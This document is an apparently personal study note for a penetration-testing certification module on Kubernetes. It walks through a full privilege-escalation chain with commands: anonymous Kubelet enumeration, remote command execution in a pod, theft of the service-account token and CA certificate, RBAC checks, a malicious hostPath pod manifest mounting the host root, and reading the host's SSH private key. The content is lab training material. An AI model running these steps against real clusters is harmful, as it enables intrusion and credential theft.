## 1. What Is Kubernetes?

**Kubernetes (K8s)** is an open-source **container orchestration system** used to deploy, scale, and manage containerized applications.

Unlike Docker, which primarily provides containerization, Kubernetes manages **large numbers of containers** across a cluster.

```text
Docker
  ↓
Containerization

Kubernetes
  ↓
Container orchestration
  ↓
Manage many containers
```

---

# 2. Kubernetes Architecture

A Kubernetes cluster has two major parts:

```text
              KUBERNETES CLUSTER
┌─────────────────────────────────────────┐
│                                         │
│          CONTROL PLANE                  │
│          (Master Node)                  │
│                                         │
│     Manages cluster + desired state     │
│                  │                      │
│        ┌─────────┼─────────┐            │
│        ↓         ↓         ↓            │
│     Worker    Worker    Worker          │
│      Node      Node      Node            │
│        │         │         │             │
│      Pods      Pods      Pods            │
│                                         │
└─────────────────────────────────────────┘
```

### Control Plane

Responsible for:

- Managing the cluster
    
- Scheduling workloads
    
- Maintaining desired state
    
- Processing administrative requests
    

### Worker Nodes

Run the actual containerized applications.

---

# 3. Pods

A **Pod** is the basic Kubernetes workload unit.

A pod can contain:

```text
Pod
├── Container
├── Container
└── ...
```

Pods have their own:

- IP
    
- Hostname
    
- Other networking/runtime details
    

### Important

```text
Kubernetes
   ↓
Pod
   ↓
Container(s)
```

---

# 4. Kubernetes vs Docker

|Docker|Kubernetes|
|---|---|
|Container platform|Container orchestration|
|Runs containers|Manages containers|
|Manual scaling|Automatic scaling|
|Simpler networking|Complex networking/policies|
|Volumes|Broad storage options|

### Easy memory

```text
Docker      = Build/run containers
Kubernetes  = Manage/orchestrate containers
```

---

# 5. Control Plane Components

Important Kubernetes services/ports:

|Component|Port|
|---|--:|
|`etcd`|`2379`, `2380`|
|API Server|`6443`|
|Scheduler|`10251`|
|Controller Manager|`10252`|
|Kubelet API|`10250`|
|Read-Only Kubelet API|`10255`|

### CPTS ports to memorize

```text
6443  → Kubernetes API Server
10250 → Kubelet API
10255 → Read-only Kubelet API
2379  → etcd
```

---

# 6. Kubernetes API Server

The **API Server** is the main entry point for administrative interaction with Kubernetes.

It handles requests such as:

```text
GET
POST
PUT
PATCH
DELETE
```

These can retrieve, create, modify, or delete Kubernetes resources.

```text
kubectl
   │
   ↓
API Server :6443
   │
   ├── Pods
   ├── Services
   ├── Deployments
   └── Other resources
```

---

# 7. Authentication vs Authorization

Kubernetes separates:

### Authentication

**Who are you?**

Possible methods include:

- Client certificates
    
- Bearer tokens
    
- Authenticating proxy
    
- Basic authentication
    

### Authorization

**What are you allowed to do?**

Kubernetes commonly uses:

**RBAC — Role-Based Access Control**

```text
User
 │
 ↓
Authentication
 │
 ↓
"Who are you?"
 │
 ↓
Authorization / RBAC
 │
 ↓
"What can you do?"
```

---

# 8. Kubelet API

The **Kubelet** runs on worker nodes and interacts with containers/pods.

A major security concern is **anonymous access** to the Kubelet API.

The module states that the Kubelet can permit anonymous access, meaning requests without valid client credentials may be treated as anonymous.

### Important port

```text
10250 → Kubelet API
```

---

# 9. Testing the Kubernetes API Server

The API server commonly listens on:

```text
6443
```

Example:

```bash
curl https://10.129.10.11:6443 -k
```

The supplied example returns:

```text
403 Forbidden
```

and:

```text
User "system:anonymous"
```

### Meaning

```text
Request
   ↓
API Server :6443
   ↓
Anonymous user
   ↓
Authorization check
   ↓
403 Forbidden
```

A `403` does **not** mean the server is useless.

It confirms:

```text
Kubernetes API exists
+
Your current request is unauthorized
```

---

# 10. Kubelet API — Extracting Pods

The module queries:

```bash
curl https://10.129.10.11:10250/pods -k | jq .
```

The response can reveal:

- Pod names
    
- Namespaces
    
- UIDs
    
- Creation timestamps
    
- Container images
    
- Last-applied configuration
    

### Why this matters

Container image information can help identify vulnerable software.

Configuration data may also expose:

- Passwords
    
- Secrets
    
- API tokens
    
- Deployment information
    

---

# 11. `kubeletctl`

`kubeletctl` is a tool used to interact with the Kubelet API.

Enumerate pods:

```bash
kubeletctl -i --server 10.129.10.11 pods
```

Example output can show:

```text
POD
NAMESPACE
CONTAINERS
```

---

# 12. Scan for RCE

The module uses:

```bash
kubeletctl -i --server 10.129.10.11 scan rce
```

This identifies pods where command execution may be possible.

Example:

```text
NODE IP       POD       NAMESPACE   CONTAINER    RCE
10.129.10.11  nginx     default     nginx        +
```

### Attack chain

```text
Reachable Kubelet
       ↓
Enumerate pods
       ↓
Identify RCE-capable pod
       ↓
Execute commands
       ↓
Container access
```

---

# 13. Execute Commands Inside a Pod

Example:

```bash
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

Result:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Important distinction:

```text
uid=0 inside container
        ≠
automatically root on host
```

You need to investigate how isolated the container is and what resources it can access.

The module notes that container-root access can potentially lead to further access against the host or other containers.

---

# 14. Kubernetes Service Account Token

Pods can have a Kubernetes **service account**.

The module retrieves the token from:

```text
/var/run/secrets/kubernetes.io/serviceaccount/token
```

Using:

```bash
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

The token can potentially provide authenticated access to the Kubernetes API depending on its RBAC permissions.

---

# 15. Service Account Certificate

The module also retrieves:

```text
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

Example:

```bash
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

Now we have:

```text
k8.token
   +
ca.crt
   ↓
Authenticated Kubernetes API interaction
```

---

# 16. Enumerating RBAC Permissions

First:

```bash
export token=`cat k8.token`
```

Then:

```bash
kubectl --token=$token \
  --certificate-authority=ca.crt \
  --server=https://10.129.10.11:6443 \
  auth can-i --list
```

This asks Kubernetes:

> **What operations can this identity perform?**

Example:

```text
pods    [get create list]
```

This is extremely important.

### Think:

```text
Token
  ↓
Who am I?
  ↓
auth can-i --list
  ↓
What can I access?
  ↓
Can I create pods?
```

---

# 17. Why `create pods` Is Dangerous

If the compromised service account can:

```text
create pods
```

the module demonstrates creating a pod that mounts the host's root filesystem.

This is the critical escalation concept:

```text
Compromised token
      ↓
RBAC allows pod creation
      ↓
Create malicious pod
      ↓
hostPath → /
      ↓
Host filesystem mounted
      ↓
Access host resources
```

---

# 18. Pod YAML

The supplied example:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

### Most important part

```yaml
hostPath:
   path: /
```

This requests access to the host's root filesystem.

---

# 19. `hostPath`

Understand this very well for CPTS.

```text
hostPath
    ↓
Mount a path from the Kubernetes node
    ↓
Inside the pod
```

Here:

```text
hostPath: /
```

means:

```text
NODE
 /
 │
 ├── etc
 ├── home
 ├── root
 ├── var
 └── usr
        │
        ↓
      POD
      /root
```

This creates a potential boundary-crossing path from the pod to the node.

---

# 20. Creating the Pod

The module uses:

```bash
kubectl --token=$token \
  --certificate-authority=ca.crt \
  --server=https://10.129.96.98:6443 \
  apply -f privesc.yaml
```

Result:

```text
pod/privesc created
```

Then:

```bash
kubectl --token=$token \
  --certificate-authority=ca.crt \
  --server=https://10.129.96.98:6443 \
  get pods
```

The newly created:

```text
privesc
```

appears as:

```text
Running
```

---

# 21. Extracting Sensitive Host Data

Once the pod is running, the module demonstrates command execution against it and accessing:

```text
/root/root/.ssh/id_rsa
```

using:

```bash
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

The key concept is:

```text
Pod
 ↓
hostPath /
 ↓
Host filesystem
 ↓
Sensitive host files
```

---

# 22. Full Kubernetes PrivEsc Chain

```text
                KUBERNETES
                    │
                    ↓
             Kubelet :10250
                    │
                    ↓
              Enumerate pods
                    │
                    ↓
             Find RCE-capable pod
                    │
                    ↓
            Execute inside pod
                    │
                    ↓
       Service account token + CA
                    │
                    ↓
             Kubernetes API
                    │
                    ↓
            auth can-i --list
                    │
                    ↓
          Can create pods?
                    │
                   YES
                    ↓
          Create privileged pod
                    │
                    ↓
            hostPath: /
                    │
                    ↓
           Host filesystem
                    │
                    ↓
        Sensitive host resources
                    │
                    ↓
             Privilege Escalation
```

---

# 23. Kubernetes Attack Surface

During CPTS enumeration, think about these components:

```text
Kubernetes
│
├── API Server :6443
│
├── Kubelet :10250
│
├── Read-only Kubelet :10255
│
├── etcd :2379/2380
│
├── Pods
│
├── Service Accounts
│
├── RBAC
│
├── Secrets
│
└── hostPath / privileged containers
```

---

# 🔥 CPTS Must-Know

### Important ports

```text
6443  → API Server
10250 → Kubelet API
10255 → Read-only Kubelet API
2379  → etcd
2380  → etcd
```

### Important commands

```bash
curl https://<IP>:6443 -k
```

```bash
curl https://<IP>:10250/pods -k | jq .
```

```bash
kubeletctl -i --server <IP> pods
```

```bash
kubeletctl -i --server <IP> scan rce
```

```bash
kubeletctl -i --server <IP> exec "id" -p <pod> -c <container>
```

### Service account token

```text
/var/run/secrets/kubernetes.io/serviceaccount/token
```

### CA certificate

```text
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

### RBAC enumeration

```bash
kubectl --token=$token \
  --certificate-authority=ca.crt \
  --server=https://<IP>:6443 \
  auth can-i --list
```

### High-value permission

```text
pods → create
```

### High-value Kubernetes configuration

```yaml
hostPath:
   path: /
```

---

# 🧠 Final Revision Card

```text
K8S PRIVESC
══════════════════════════════════════

Kubelet :10250
      ↓
Enumerate pods
      ↓
Find RCE
      ↓
Execute inside pod
      ↓
Get service-account token
      ↓
Get ca.crt
      ↓
Kubernetes API :6443
      ↓
auth can-i --list
      ↓
Can create pods?
      ↓
YES
      ↓
Create pod with hostPath /
      ↓
Host filesystem
      ↓
Host resources
      ↓
PRIVESC
```

### 🔑 Memory trick

**`10250 → pods → RCE → token → RBAC → create pod → hostPath / → host`.**